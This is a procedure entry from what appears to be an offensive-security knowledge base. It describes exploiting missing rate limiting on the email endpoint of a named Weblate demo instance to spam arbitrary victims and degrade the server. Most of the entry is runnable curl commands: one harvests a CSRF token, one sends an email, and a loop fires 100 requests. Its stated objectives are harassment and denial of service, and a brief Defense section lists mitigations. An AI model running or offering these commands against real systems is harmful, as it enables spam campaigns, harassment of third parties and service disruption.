---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - rate-limiting
  - dos
  - spam
  - web-vulnerability
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
commands:
  - '[[commands/curl-post-email-spam]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:32:01.553Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
---
# Send-Unlimited-Emails-via-Unprotected-Endpoint

## Summary

This procedure exploits the missing rate limiting on the POST /accounts/email/ endpoint in Weblate applications to send unlimited spam emails to arbitrary victims, potentially enabling harassment, unintended account invitations, and denial-of-service via resource exhaustion on the email server.

## Description

In vulnerable Weblate instances, such as the demo subdomain, the email sending functionality lacks rate limiting despite CSRF protection. Attackers can craft repeated POST requests with victim email addresses and minimal or empty content to trigger email dispatch without restrictions. This leads to spam campaigns or server overload from high-volume requests, as the backend processes each request individually. The attack requires obtaining a valid CSRF token but no authentication, making it accessible from public networks. Expected outcomes include successful email delivery to victims and gradual degradation of server performance under load.

## Requirements

1. Public access to the target Weblate instance (e.g., demo.weblate.org)
2. A valid CSRF token, obtainable via browser inspection or a preliminary GET request to the endpoint
3. HTTP client like curl for sending POST requests
4. List of victim email addresses for spamming

## Defense

Defensive measures and detection strategies:

- Implement rate limiting on email endpoints using libraries like django-ratelimit
- Monitor email sending logs for unusual volume from single IPs
- Add CAPTCHA or secondary verification for email-related actions
- Use web application firewalls (WAF) to detect and block repetitive POST patterns

## Objectives

1. Flood victims with unwanted emails to cause harassment or phishing-like abuse
2. Exhaust server resources by triggering excessive email processing
3. Demonstrate vulnerability for reporting and remediation

## Instructions

### Step 1: Obtain CSRF Token

**Context**: The endpoint requires a CSRF token for protection, but it can be extracted from the login or email page.

**Command** ([[curl-get-csrf]]):
```bash
curl -c cookies.txt 'https://demo.weblate.org/accounts/email/'
```

> This command fetches the page and saves cookies, including the CSRF token. Inspect the response or cookies.txt to extract the token value (e.g., grep for 'csrftoken'). Expected output: HTML page with form, cookies file containing token.

### Step 2: Send Single Spam Email

**Context**: Craft a POST request with victim email and empty content to test email dispatch.

**Command** ([[commands/curl-post-email-spam]]):
```bash
curl -X POST 'https://demo.weblate.org/accounts/email/' \
  -H 'Referer: https://demo.weblate.org/accounts/email/' \
  -H 'X-CSRFToken: your_csrf_token_here' \
  -d 'email=victim@example.com&content=' \
  -c cookies.txt
```

> This sends one email. Expected output: HTTP 200 or 302 redirect, indicating success. No errors if rate limiting is absent.

### Step 3: Automate Repeated Requests for DoS

**Context**: Loop the request to simulate high volume, leading to spam and resource exhaustion.

**Command** ([[commands/curl-post-email-spam]]):
```bash
for i in {1..100}; do
  curl -X POST 'https://demo.weblate.org/accounts/email/' \
    -H 'Referer: https://demo.weblate.org/accounts/email/' \
    -H 'X-CSRFToken: your_csrf_token_here' \
    -d "email=victim$i@example.com&content=" \
    -c cookies.txt > /dev/null 2>&1
  sleep 0.1
done
```

> This sends 100 emails rapidly. Expected output: No throttling errors; monitor server response times for slowdowns indicating DoS.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Impact]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Network Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-email-spam]]

## Tools Used


## Tags

- rate-limiting
- dos
- spam
- web-vulnerability
